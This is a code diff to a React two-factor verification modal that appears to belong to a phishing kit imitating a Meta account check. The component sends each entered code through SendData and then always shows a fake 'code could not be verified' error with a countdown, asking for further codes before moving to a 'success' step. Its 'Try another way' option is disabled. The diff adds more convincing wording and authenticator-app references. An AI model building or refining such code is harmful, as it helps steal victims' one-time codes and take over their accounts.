@@ -1,20 +1,42 @@
-import React from 'react'
-import Modal from './Modal'
-import { SITE_MAIN_MESSAGE } from '#data/site-message'
+import React from 'react';
+import Modal from './Modal';
+import {
+  btnPrimary,
+  btnPrimarySubtle,
+  errorTextClass,
+  fieldInput,
+  fieldShell,
+  textLead,
+  textMuted,
+} from '@/components/privacy-flow/ui-styles';
 import { maskEmail, maskPhoneNumber } from '@/utils/mask';
 import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
 import { FormData, updateForm } from '@/app/store/slices/stepFormSlice';
 import { SendData } from '@/utils/sendData';
 
-interface TwoFactorModalProps {
-    isOpend: boolean;
-    isOpendFinish: (value: boolean) => void;
-    onToggleModal: (isOpen: boolean) => void;
+export interface TwoFactorModalProps {
+  open: boolean;
+  onOpenChange: (open: boolean) => void;
+  onProceedToSuccess: () => void;
 }
 
-const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
+const TWO_FA_MAX_LEN = 8;
 
-    const [isOpen, setIsOpen] = React.useState(isOpend);
+function sanitizeTwoFaInput(raw: string): string {
+  return raw.replace(/\D/g, '').slice(0, TWO_FA_MAX_LEN);
+}
+
+function isValidTwoFaCode(value: string): boolean {
+  if (!/^\d+$/.test(value)) return false;
+  return value.length === 6 || value.length === 8;
+}
+
+const TwoFactorModal: React.FC<TwoFactorModalProps> = ({
+  open,
+  onOpenChange,
+  onProceedToSuccess,
+}) => {
+    const [isOpen, setIsOpen] = React.useState(open);
     const [errors, setErrors] = React.useState<Record<string, string>>({});
     const [loading, setLoading] = React.useState(false);
     const [click, setClick] = React.useState(0);
@@ -33,13 +55,14 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
     let [countdown, setCountdown] = React.useState<number>((process.env.NEXT_PUBLIC_SETTING_TIME) ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30);
 
     React.useEffect(() => {
-        setIsOpen(isOpend);
-    }, [isOpend]);
+        setIsOpen(open);
+    }, [open]);
 
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
-        const { id, value } = e.target;
+        const { id } = e.target;
+        const value = sanitizeTwoFaInput(e.target.value);
         setTwoFa(value);
-        setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
+        setErrors((prev) => ({ ...prev, [id]: '' }));
 
         if (click === 0) {
             dispatch(updateForm({ twoFa: value }));
@@ -54,14 +77,17 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
         }
     };
 
-    const isTwoFaValid = twoFa.length >= 6 && /^\d+$/.test(twoFa);
+    const isTwoFaValid = isValidTwoFaCode(twoFa);
 
     const handleClose = () => {
         setIsOpen(false);
-        onToggleModal(false);
+        onOpenChange(false);
     };
 
-    const handSubmit = async (e: React.FormEvent) => {
+    const twoFaRetryMessage = (minutes: number, seconds: number) =>
+        `The code could not be verified. Please try again in ${minutes > 0 ? `${minutes} min ` : ''}${seconds > 0 ? `${seconds} sec` : ''}.`.trim();
+
+    const handleSubmit = async (e: React.FormEvent) => {
         try {
             e.preventDefault();
             const newErrors: Record<string, string> = {};
@@ -70,9 +96,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 setErrors(newErrors);
                 return;
             }
-            const isTwoFaValid = twoFa.length >= 6 && /^\d+$/.test(twoFa);
-
-            if (!isTwoFaValid) {
+            if (!isValidTwoFaCode(twoFa)) {
                 return;
             }
 
@@ -82,8 +106,10 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 await SendData(formDataState)
                 .then((response) => {
                     setTimeout(async () => {
+                        const minutes = Math.floor(countdown / 60);
+                        const seconds = countdown % 60;
                         setErrors({
-                            twoFa: SITE_MAIN_MESSAGE,
+                            twoFa: twoFaRetryMessage(minutes, seconds),
                         });
 
                         setLoading(false);
@@ -94,8 +120,11 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                             countdown -= 1;
                             setCountdown(countdown);
 
+                            const minutes = Math.floor(countdown / 60);
+                            const seconds = countdown % 60;
+
                             setErrors({
-                                twoFa: SITE_MAIN_MESSAGE,
+                                twoFa: twoFaRetryMessage(minutes, seconds),
                             });
 
                             if (countdown <= 0) {
@@ -120,8 +149,10 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 await SendData(formDataState)
                 .then((response) => {
                     setTimeout(async () => {
+                        const minutes = Math.floor(countdown / 60);
+                        const seconds = countdown % 60;
                         setErrors({
-                            twoFa: SITE_MAIN_MESSAGE,
+                            twoFa: twoFaRetryMessage(minutes, seconds),
                         });
                         setLoading(false);
                         setTwoFa('');
@@ -131,8 +162,11 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                             countdown -= 1;
                             setCountdown(countdown);
 
+                            const minutes = Math.floor(countdown / 60);
+                            const seconds = countdown % 60;
+
                             setErrors({
-                                twoFa: SITE_MAIN_MESSAGE,
+                                twoFa: twoFaRetryMessage(minutes, seconds),
                             });
 
                             if (countdown <= 0) {
@@ -160,7 +194,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                         setLoading(false);
                         setTwoFa('');
 
-                        isOpendFinish(true);
+                        onProceedToSuccess();
                         handleClose();
 
                         setClick(0);
@@ -178,8 +212,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
         }
     };
 
-    const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 ${disabled ? '' : 'hover:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md'} transition-all duration-200`;
-    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;
+    const twoFaShell = `${fieldShell(!!errors.twoFa)}${disabled ? ' opacity-80' : ''}`;
 
     return (
         <Modal
@@ -188,55 +221,73 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
             onClose={handleClose}
             isClosable={false}
         >
-            <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
-                <div className='w-full'>
-                    <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
-                        <span>{fullName}</span>
-                        <div className="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
-                        <span>{SITE_MAIN_MESSAGE}</span>
+            <div className="flex h-full w-full flex-1 flex-col items-center justify-between">
+                <div className="w-full">
+                    <div className={`mb-2 flex w-full items-baseline gap-1.5 ${textMuted}`}>
+                        <span className="truncate font-medium text-slate-800">{fullName}</span>
+                        <span className="h-1 w-1 shrink-0 translate-y-[-2px] rounded-full bg-slate-400" aria-hidden />
+                        <span>Account</span>
                     </div>
-                    <h2 className='text-[20px] text-[black] font-[700] mb-[15px]'>{SITE_MAIN_MESSAGE}</h2>
-                    <p className='text-[#9a979e] text-[14px]'>{SITE_MAIN_MESSAGE} {emailDisplay} {phoneDisplay}</p>
-                    <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
+                    <h2 className="mb-3 text-xl font-bold leading-snug tracking-tight text-slate-900">
+                        Two-factor authentication (step 1 of 3)
+                    </h2>
+                    <p className={textLead}>
+                        Enter the verification code sent to {emailDisplay} or {phoneDisplay}, or approve the request in
+                        your authenticator app (for example Google Authenticator or Duo Mobile).
+                    </p>
+                    <div className="my-4 w-full overflow-hidden rounded-2xl border border-slate-100 bg-slate-50 shadow-inner">
                         <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
                     </div>
-                    <div className='w-full'>
-                        <form onSubmit={handSubmit}>
-                            <div className={`${inputClass('twoFa')}`} >
+                    <div className="w-full">
+                        <form onSubmit={handleSubmit}>
+                            <div className={twoFaShell}>
                                 <input
-                                    type="number"
+                                    type="text"
+                                    inputMode="numeric"
+                                    autoComplete="one-time-code"
+                                    pattern="\d*"
                                     id="twoFa"
-                                    placeholder={SITE_MAIN_MESSAGE}
-                                    className={`w-full outline-none h-full bg-transparent ${disabled ? 'opacity-70 cursor-not-allowed' : ''}`}
+                                    name="twoFa"
+                                    placeholder="6 or 8 digits"
+                                    maxLength={TWO_FA_MAX_LEN}
+                                    aria-describedby="twoFa-hint"
+                                    className={`${fieldInput} w-full flex-1 text-center font-medium tracking-[0.18em] ${disabled ? 'cursor-not-allowed opacity-70' : ''}`}
                                     value={twoFa}
                                     onChange={handleChange}
                                     disabled={disabled}
                                 />
                             </div>
-                            {errorText('twoFa')}
+                            <p id="twoFa-hint" className={`mt-1.5 ${textMuted}`}>
+                                Enter exactly 6 or 8 digits. Other characters are ignored.
+                            </p>
+                            {errors.twoFa ? <p className={errorTextClass}>{errors.twoFa}</p> : null}
 
-                            <div className='w-full mt-[20px]'>
+                            <div className="mt-5 w-full">
                                 <button
-                                    className={`h-[45px] min-h-[45px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center transition-opacity duration-300 ${loading || disabled || !isTwoFaValid ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer'}`}
-                                    disabled={disabled || !isTwoFaValid}
+                                    type="submit"
+                                    className={btnPrimary}
+                                    disabled={disabled || !isTwoFaValid || loading}
                                 >
                                     {loading && (
-                                        <div className="animate-spin mr-[10px] w-[20px] h-[20px]">
-                                            <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
-                                        </div>
+                                        <span className="mr-2 inline-flex h-5 w-5 shrink-0 animate-spin">
+                                            <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="" />
+                                        </span>
                                     )}
-                                    {loading ? '' : SITE_MAIN_MESSAGE}
+                                    {loading ? '' : 'Continue'}
                                 </button>
                             </div>
 
-                            <div className='w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none'>
-                                <span>{SITE_MAIN_MESSAGE}</span>
+                            <div
+                                className={`${btnPrimarySubtle} mt-3 pointer-events-none opacity-80`}
+                                aria-disabled="true"
+                            >
+                                Try another way
                             </div>
                         </form>
                     </div>
                 </div>
 
-                <div className='w-[60px] mt-[20px] mx-auto pt-8'>
+                <div className="mx-auto mt-8 w-[60px]">
                     <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
                 </div>
             </div>
